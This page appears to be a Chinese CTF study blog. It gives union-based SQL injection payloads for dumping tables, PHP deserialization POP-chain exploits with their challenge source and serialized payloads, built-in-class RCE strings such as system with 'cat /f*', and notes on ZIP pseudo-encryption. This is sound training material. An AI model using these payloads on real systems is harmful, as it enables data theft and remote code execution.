+<h4 id="eg-NSSCTF"><a href="#eg-NSSCTF" class="headerlink" title="eg NSSCTF"></a>eg NSSCTF</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=1&#x27;order by 3 --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1 &#x27; union select 1, 2, @@version -- &#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1 &#x27; union select 1, 2, user() -- &#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=-1 &#x27; union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;-- &#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=-1 &#x27; union select 1, 2, group_concat(column_name) from information_schema.columns where table_name=&#x27;test_tb&#x27; -- &#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=-1 &#x27; union select 1,2, group_concat(flag) from test_tb -- &#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Newstar"><a href="#Newstar" class="headerlink" title="Newstar"></a>Newstar</h4><h5 id="谢谢皮蛋"><a href="#谢谢皮蛋" class="headerlink" title="谢谢皮蛋"></a>谢谢皮蛋</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 order by 2#</span><br><span class="line">-1 union select 1,2#</span><br><span class="line">-1 union select 1,database()#</span><br><span class="line">-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line">-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;Fl4g&#x27; and table_schema=database()#</span><br><span class="line">-1 union select group_concat(des),group_concat(value) from Fl4g#</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-反序列化" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/19/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  	<time datetime="2025-04-19T05:12:33.254Z" itemprop="datePublished">2025-04-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>[TOC]</p>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p><strong>1._construct()</strong> </p>
+<p>实例化对象里面有魔术方法是会触发该条件（实例化一个对象的时候）</p>
+<p><strong>2._destruct() _</strong></p>
+<p>_代码执行完被释放的时候，代码运行完会销毁，出发析构函数_destruct()</p>
+<p><strong>3._sleep():</strong> </p>
+<p>触发时机:序列化serialize()之前 功能：对象被序列化之前出发，返回需要被序列化存储的成员属性，删除不必要的属性 参数：return array</p>
+<p>**4._wakeup(): **</p>
+<p>触发时机：反序列化之前</p>
+<p><strong>5.call():</strong></p>
+<p>调用一个不存在的函数</p>
+<p>如果一个类没有设置 call() ，对象无法调用受限方法。设置魔术方法call() ,对象成功调用受限方法。</p>
+<p><strong>6.invoke()</strong> </p>
+<p>当脚本尝试将对象调用为函数时触发（把对象当成函数就可以实现）</p>
+<p><strong>7.toString()</strong></p>
+<p>把类当作字符串使用时触发（有echo就行）</p>
+<p><strong>8.get()</strong></p>
+<p>用于从不可访问的属性读取数据</p>
+<p><strong>9.set()</strong></p>
+<p>用于将数据写入不可访问的属性</p>
+<p><strong>10.inset()</strong></p>
+<p>在不可访问的属性上调用inset()或empty()触发</p>
+<p><strong>11.unset()</strong></p>
+<p>在不可访问的属性上使用unset()时触发</p>
+<p><strong>12.callStatic</strong></p>
+<p>在静态上下文中调用不可访问的方法时触发</p>
+<p>#eg</p>
+<p>###<strong>1.</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class artifact&#123;</span><br><span class="line">    public $excalibuer;</span><br><span class="line">    public $arrow;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        echo &quot;为Saber选择了对的武器!&lt;br&gt;&quot;;</span><br><span class="line">        return $this-&gt;excalibuer-&gt;arrow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class prepare&#123;</span><br><span class="line">    public $release;</span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $functioin = $this-&gt;release;</span><br><span class="line">        echo &quot;蓄力!咖喱棒！！&lt;br&gt;&quot;;</span><br><span class="line">        return $functioin();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class saber&#123;</span><br><span class="line">    public $weapon;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        echo &quot;胜利！&lt;br&gt;&quot;;</span><br><span class="line">        include($this-&gt;weapon);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class summon&#123;</span><br><span class="line">    public $Saber;</span><br><span class="line">    public $Rider;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;开始召唤从者！&lt;br&gt;&quot;;</span><br><span class="line">        echo $this-&gt;Saber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;payload&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;payload&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class artifact&#123;</span><br><span class="line">    public $excalibuer;</span><br><span class="line">    public $arrow;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        echo &quot;为Saber选择了对的武器!&lt;br&gt;&quot;;</span><br><span class="line">        return $this-&gt;excalibuer-&gt;arrow;//3，目的是触发__get()，我们留意到这里调用了$excalibuer里的arrow属性，显然类prepare里没有arrow属性，丢到这里刚好能触发__get()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class prepare&#123;</span><br><span class="line">    public $release;</span><br><span class="line">    public function __get($key)&#123;（//2，把将 $this-&gt;release 属性赋值给了 $function）</span><br><span class="line">        $functioin = $this-&gt;release;//在这里被当作函数调用，显而易见能把saber类丢给这里的$release</span><br><span class="line">        echo &quot;蓄力!咖喱棒！！&lt;br&gt;&quot;;</span><br><span class="line">        return $functioin();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class saber&#123;</span><br><span class="line">    public $weapon;</span><br><span class="line">    public function __invoke()&#123;//文件包含的地方标记为1，想要包含需要触发__invoke()的话需要找能把saber类当作函数触发的地方</span><br><span class="line">        echo &quot;胜利！&lt;br&gt;&quot;;</span><br><span class="line">        include($this-&gt;weapon);//文件包含 想到伪协议 可以执行命令</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class summon&#123;</span><br><span class="line">    public $Saber;</span><br><span class="line">    public $Rider;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;开始召唤从者！&lt;br&gt;&quot;;</span><br><span class="line">        echo $this-&gt;Saber;//4,目的是触发刚刚第三层的tostring，这里有个echo</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new saber();</span><br><span class="line">$a-&gt;weapon=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">$b=new prepare();</span><br><span class="line">$b-&gt;release=$a;</span><br><span class="line">$c=new artifact();</span><br><span class="line">$c-&gt;excalibuer=$b;</span><br><span class="line">$d=new summon();</span><br><span class="line">$d-&gt;Saber=$c;</span><br><span class="line">echo serialize($d);</span><br><span class="line">//O:6:&quot;summon&quot;:2:&#123;s:5:&quot;Saber&quot;;O:8:&quot;artifact&quot;:2:&#123;s:10:&quot;excalibuer&quot;;O:7:&quot;prepare&quot;:1:&#123;s:7:&quot;release&quot;;O:5:&quot;saber&quot;:1:&#123;s:6:&quot;weapon&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;s:5:&quot;arrow&quot;;N;&#125;s:5:&quot;Rider&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-动态类实例化"><a href="#2-动态类实例化" class="headerlink" title="2.动态类实例化"></a>2.动态类实例化</h3><h4 id="1-Error内置类"><a href="#1-Error内置类" class="headerlink" title="1.Error内置类"></a>1.Error内置类</h4><p>也是触发_tostring方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$aa=$_GET[&#x27;aa&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">$bb=$_GET[&#x27;bb&#x27;];</span><br><span class="line">$c=$_GET[&#x27;c&#x27;];</span><br><span class="line">((new $a($aa))-&gt;$c())((new $b($bb))-&gt;$c());</span><br></pre></td></tr></table></figure>
+
+<p><strong>代码解释：</strong></p>
+<p><strong>动态类实例化：<code>new $a($aa)</code> 和 <code>new $b($bb)</code></strong> ：</p>
+<ul>
+<li>通过<code>$_GET</code>参数<code>a</code>和<code>b</code>动态实例化类。</li>
+<li>用户可以通过<code>$_GET</code>参数传递任何有效的类名，甚至可以加载恶意类。</li>
+</ul>
+<p><strong>动态类实例化：<code>new $a($aa)</code> 和 <code>new $b($bb)</code></strong> ：</p>
+<ul>
+<li>使用<code>$_GET</code>参数<code>c</code>调用动态方法。</li>
+<li>用户可以控制调用的方法，可能触发敏感方法或注入恶意代码。</li>
+</ul>
+<p><strong>链式调用：<code>((new $a($aa))-&gt;$c())((new $b($bb))-&gt;$c());</code></strong> </p>
+<ul>
+<li><ul>
+<li>用<code>$a</code>和<code>$aa</code>创建一个对象，并调用其<code>$c</code>方法。</li>
+<li>将该方法返回的结果作为函数调用，参数是另一个由<code>$b</code>和<code>$bb</code>创建的对象，并调用其<code>$c</code>方法。</li>
+</ul>
+</li>
+<li>如果<code>$c</code>返回一个可调用的对象或匿名函数，那么攻击者可以执行任意代码。</li>
+</ul>
+<p><strong>常见的攻击场景有远程代码执行（RCE ）</strong></p>
+<p><strong>wp</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=Error&amp;aa=system&amp;b=Error&amp;bb=cat /f*&amp;c=getMessage</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-DirectoryIterator内置类"><a href="#2-DirectoryIterator内置类" class="headerlink" title="2.DirectoryIterator内置类"></a>2.DirectoryIterator内置类</h4><p>触发__toString方法，找到根目录下的flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=DirectoryIterator&amp;aa=glob:///f*&amp;c=__toString</span><br><span class="line">?a=SplFileObject&amp;aa=php://filter/convert.base64-encode/resource=/flag&amp;c=__toString</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-XFCTF-ezPOP"><a href="#3-XFCTF-ezPOP" class="headerlink" title="3.XFCTF ezPOP"></a>3.XFCTF ezPOP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class AAA</span><br><span class="line">&#123;</span><br><span class="line">    public $s;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;you get 2 A &lt;br&gt;&quot;;</span><br><span class="line">        $p = $this-&gt;a;</span><br><span class="line">        return $this-&gt;s-&gt;$p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class BBB</span><br><span class="line">&#123;</span><br><span class="line">    public $c;</span><br><span class="line">    public $d;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;you get 2 B &lt;br&gt;&quot;;</span><br><span class="line">        $a=$_POST[&#x27;a&#x27;];</span><br><span class="line">        $b=$_POST;</span><br><span class="line">        $c=$this-&gt;c;</span><br><span class="line">        $d=$this-&gt;d;</span><br><span class="line">        if (isset($b[&#x27;a&#x27;])) &#123;</span><br><span class="line">            unset($b[&#x27;a&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">        call_user_func($a,$b)($c)($d);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CCC</span><br><span class="line">&#123;</span><br><span class="line">    public $c;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;you get 2 C &lt;br&gt;&quot;;</span><br><span class="line">        echo $this-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;xy&#x27;])) &#123;</span><br><span class="line">    $a = unserialize($_GET[&#x27;xy&#x27;]);</span><br><span class="line">    throw new Exception(&quot;noooooob!!!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还有点长，简单的要分析一下，要得到flag,正常是反向推理。要得到flag大概率是<code>call_user_func($a,$b)($c)($d);</code>这个实现的，简单来说这是个嵌套的函数。<code>__get</code>是调用的成员属性不存在,才会调用。而AAA里的<code>$this-&gt;s-&gt;$p;</code> 可以进行调用一个不存在的从而实现调用。<code>__toString</code>把对象当成字符串调用，通常echo就可以调用成功。<code>echo $this-&gt;c;</code>就可以实现。那么显而易见大概的流程已经出来了。</p>
+<p>CCC::destruct —&gt; AAA::toString—&gt;BBB::get</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class AAA &#123;</span><br><span class="line">    </span><br><span class="line">    public $s;</span><br><span class="line">    public $a; </span><br><span class="line">&#125;</span><br><span class="line">class BBB &#123;</span><br><span class="line">    public $c=&quot;echo system&quot;;</span><br><span class="line">    public $d=&quot;cat /flag&quot;; </span><br><span class="line">&#125;</span><br><span class="line">class CCC</span><br><span class="line">&#123; public $c; </span><br><span class="line">&#125;</span><br><span class="line">$a=new CCC;</span><br><span class="line">$b=new AAA;</span><br><span class="line">$c=new BBB;</span><br><span class="line">$a-&gt;c=$b;</span><br><span class="line">$b-&gt;s=$c;</span><br><span class="line">$b-&gt;a=&quot;eval&quot;;</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a`=new CCC;实例化调用__destruct(),之后就可以通过echo调用__tostring().里面调用`$p = $this-&gt;a;</span><br></pre></td></tr></table></figure>
+
+<p>只要给a赋值BBB不存在的变量然后通过return，就能调用__get().</p>
+<p>这里还要介绍一下implode函数，implode函数可以拼接内容，把后面的$b,c,d连起来构成语句</p>
+<p>c,c,d已经赋值好了，还需要post传值</p>
+<p>$b也可以传入exec,最后还有个小tip,原文都是2A,2B,2C，需要把类后面的属性即CCC后面的1改成2.</p>
+<p>大题思路是这样，中间可能有冗杂的内容，至少把题目写出来了</p>
+<h3 id="4-XYNU-ctf-web"><a href="#4-XYNU-ctf-web" class="headerlink" title="4.XYNU ctf web"></a>4.XYNU ctf web</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class artifact&#123;</span><br><span class="line">    public $excalibuer;</span><br><span class="line">    public $arrow;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        echo &quot;how to bypass?&quot;;</span><br><span class="line">        return $this-&gt;excalibuer-&gt;arrow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class prepare&#123;</span><br><span class="line">    public $release;</span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $functioin = $this-&gt;release;</span><br><span class="line">        echo &quot;prepare to hack&quot;;</span><br><span class="line">        return $functioin();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class hacking&#123;</span><br><span class="line">    public $weapon;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        echo &quot;win!&quot;;</span><br><span class="line">        include($this-&gt;weapon);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class summon&#123;</span><br><span class="line">    public $Hacker;</span><br><span class="line">    public $Rider;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;start hacking&quot;;</span><br><span class="line">        echo $this-&gt;Hacker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;payload&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;payload&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">先知道用到的几种魔术方法</span><br><span class="line"></span><br><span class="line">__toString：当一个对象被当作一个字符串被调用，把类当作字符串使用时触发。</span><br><span class="line"></span><br><span class="line">__get()：用于从不可访问的属性读取数据，即在调用私有属性的时候会自动执行</span><br><span class="line"></span><br><span class="line">__invoke：当脚本尝试将对象调用为函数时触发</span><br><span class="line"></span><br><span class="line">__wakeup：调用unserialize()时触发</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class artifact&#123;</span><br><span class="line">    public $excalibuer;</span><br><span class="line">    public $arrow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class prepare&#123;</span><br><span class="line">    public $release;</span><br><span class="line">&#125;</span><br><span class="line">class hacking&#123;</span><br><span class="line">    public $weapon;</span><br><span class="line">&#125;</span><br><span class="line">class summon&#123;</span><br><span class="line">    public $Hacker;</span><br><span class="line">    public $Rider;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 构建POP链</span><br><span class="line">// 1. 初始化hacking对象（最终执行文件包含）</span><br><span class="line">$h = new hacking();</span><br><span class="line">$h-&gt;weapon=&quot;/var/log/nginx/access.log&quot;; // 目标文件</span><br><span class="line"></span><br><span class="line">// 2. 初始化prepare对象（触发__get）</span><br><span class="line">$p = new prepare();</span><br><span class="line">$p-&gt;release = $h; // 将hacking对象绑定到release属性</span><br><span class="line"></span><br><span class="line">// 3. 初始化artifact对象（触发__toString）</span><br><span class="line">$a = new artifact();</span><br><span class="line">$a-&gt;excalibuer = $p; // 将prepare对象绑定到excalibuer属性</span><br><span class="line"></span><br><span class="line">// 4. 初始化summon对象（反序列化入口）</span><br><span class="line">$s = new summon();</span><br><span class="line">$s-&gt;Hacker = $a; // 将artifact对象绑定到Hacker属性</span><br><span class="line"></span><br><span class="line">// 生成Payload</span><br><span class="line">$payload = serialize($s);</span><br><span class="line">echo $payload;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=O:6:&quot;summon&quot;:2:&#123;s:6:&quot;Hacker&quot;;O:8:&quot;artifact&quot;:2:&#123;s:10:&quot;excalibuer&quot;;O:7:&quot;prepare&quot;:1:&#123;s:7:&quot;release&quot;;O:7:&quot;hacking&quot;:1:&#123;s:6:&quot;weapon&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;&#125;&#125;s:5:&quot;arrow&quot;;N;&#125;s:5:&quot;Rider&quot;;N;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="php反序列化字符逃逸"><a href="#php反序列化字符逃逸" class="headerlink" title="php反序列化字符逃逸"></a>php反序列化字符逃逸</h3><p><strong>字符变多:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">总结：</span><br><span class="line">先看过滤函数，找出字符变多还是字符变少，并且计算变化个数</span><br><span class="line">多出一个字符，构造过滤字符的个数为构造的payload的长度</span><br><span class="line">多出n个字符，构造过滤字符的个数为构造的payload的长度/n</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-伪加密" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/19/%E4%BC%AA%E5%8A%A0%E5%AF%86/" class="article-date">
+  	<time datetime="2025-04-19T03:17:23.551Z" itemprop="datePublished">2025-04-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>a.压缩源文件数据区：</p>
+<p>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>09 00：全局方式位标记（有无加密）<br>08 00：压缩方式<br>50 A3：最后修改文件时间<br>A5 4A：最后修改文件日期<br>21 38 76 64：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>08 00：文件名长度<br>00 00：扩展记录长度</p>
+<p>666C61672E7478744BCB494CAF764CC935F4D3753272D7CD0ED50D8EF20CA80500</p>
+<p>b.压缩源文件目录区:</p>
